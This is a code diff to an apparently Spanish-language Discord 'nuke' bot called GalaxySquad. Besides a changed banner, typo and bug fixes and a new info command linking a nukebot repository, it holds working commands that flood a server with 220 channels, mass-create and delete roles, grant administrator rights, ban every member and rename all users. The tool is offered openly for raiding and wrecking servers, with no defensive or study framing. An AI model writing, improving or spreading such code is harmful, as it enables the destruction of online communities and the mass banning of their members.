@@ -23,27 +23,33 @@ bot.remove_command("help")
 async def on_ready():
  await bot.change_presence(status=discord.Status.dnd, activity=discord.Game('Prefix = >'))    
  print('''
-_____ _                  
-| __ \ | |                 
-| | \/ __ _| | __ ___ ___ _
-| | __ / _` | |/ _` \ \/ / | | |
-| |_\ \ (_| | | (_| |> <| |_| |
- \____/\__,_|_|\__,_/_/\_\\__, |
-                           __/ |
-                          |__
-#galaxy squad
+               _.---**""**-.       
+._   .-'           /|`.     
+ \`.'             / |  `.   
+  V              (  ;    \  
+  L       _.-  -. `'      \ 
+ / `-. _.'       \         ;
+:            __   ;    _   |
+:`-.___.+-*"': `  ;  .' `. |
+|`-/     `--*'   /  /  /`.\|
+: :              \    :`.| ;
+| |   .           ;/ .' ' / 
+: :  / `             :__.'  
+ \`._.-'       /     |      
+  : )         :      ;      
+  :----.._    |     /       
+ : .-.    `.       /        
+  \     `._       /         
+  /`-            /          
+ :             .'           
+  \ )       .-'             
+   `-----*"'     [GalaxySQ]
 
 >bot creado por hades
 >Gracias por usar mi codigo
-comandos :    
-                         >raid    
-                         >mr(roles masivos)
-                         >dr(eliminar roles)    
-                         >admin
-                         >banall            
-                         >nc
-prefix: >  
-  
+comandos :           >raid >mr >dr 
+                     >admin >banall >nc
+prefix: >    
                                  by hades''')
 
 @bot.event
@@ -65,7 +71,7 @@ async def raid(ctx):
    pass
  for i in range(0, 220):
        await ctx.guild.create_text_channel(nombre)
-       print("raid iniciado")
+       print("raid inciado")
  
 @bot.command(name="mr")
 async def RolMasivo(ctx, amount: int = 250, *, name="RaidBygalaxy💀"):
@@ -100,7 +106,7 @@ async def Admins(ctx, *, rolename="GalaxySquad"):
 
 @bot.command()
 async def banall(ctx):
-    await ctx.message.delete
+    await ctx.message.delete()
     for m in ctx.guild.members:
             try:
                 await m.ban()
@@ -122,17 +128,25 @@ async def nc(ctx, *, name="GalaxyOnTop"):
 async def help(ctx):
         author = ctx.author
         embedVar = discord.Embed(title="comandos", color=0xff0000)
-        embedVar.add_field(name="Raid", value= '''``` 
-         raid
-         mr(roles masivos)
-         dr(eliminar roles)
-         admin(te da administrador)
-         banall
-         >nc(cambia el nombre de todos)
+        embedVar.add_field(name="Raid", value= '''``` raid(crea canales + ping) mr(roles masivos) dr(eliminar roles) admin(te da administrador) banall(banea a todos los usuarios) nc(cambia el nombre de todos)
          ```''', inline = False)
         embedVar.set_image(url="https://media.discordapp.net/attachments/964444776671870996/973434490733092964/20220509_044512.gif ")
         embedVar.set_footer(text=f"#GalaxySQ")
         await ctx.send(embed=embedVar)
+
+
+@bot.command()
+async def info(ctx):
+	a = ctx.author
+	info = discord.Embed(title = "informacion", color = 0xff0000)
+	info.add_field(name = "info", value= '''este bot fue creado por:!    ᴀᶻᵏᵉᵉˡ#2538
+   codigo creado por :нα∂єѕ#5438 
+   comando de ayuda: >help
+    prefix : >
+    ''')
+	info.set_image(url="https://media.discordapp.net/attachments/896917826122706956/963948349579476993/20220111_050031.gif")
+	info.add_field(name= "codigo", value = "https://github.com/Ninjabrine520/nukebot-Discord.py.git")
+	await ctx.send(embed=info)
 
 token = "token del bot"                   
 bot.run(token)
